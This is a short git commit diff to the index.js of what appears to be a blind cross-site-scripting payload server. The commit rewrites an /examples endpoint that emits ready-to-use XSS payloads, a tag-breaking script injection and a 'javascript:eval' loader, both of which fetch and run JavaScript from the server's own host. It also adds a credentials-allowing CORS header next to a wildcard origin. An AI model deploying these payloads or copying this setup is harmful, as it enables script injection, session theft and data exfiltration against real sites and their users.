1e5afd027c594679d23852a5decfe58d5abd3d85
eanmcc8 <eanmcc86@proton.me>
2025-05-24 20:51:17 -0500

    Update index.js

--- index.js
+++ index.js
@@ -24,6 +24,7 @@ app.use(function (req, res, next) {
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
   res.header("Access-Control-Allow-Headers", "Content-Type");
+    res.header("Access-Control-Allow-Credentials", "true");
   next();
 });
 
@@ -95,8 +96,8 @@ async function uploadImage(image) {
 app.get("/examples", (req, res) => {
   res.header("Content-Type", "text/plain");
   //var url = req.protocol + '://' + req.headers['host']
-  //var url = "https://globalcu.org" + req.headers["host"];
-  var url = "https://globalcu.org";
+  var url = "https://" + req.headers["host"];
+  //var url = "https://globalcu.org";
   var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
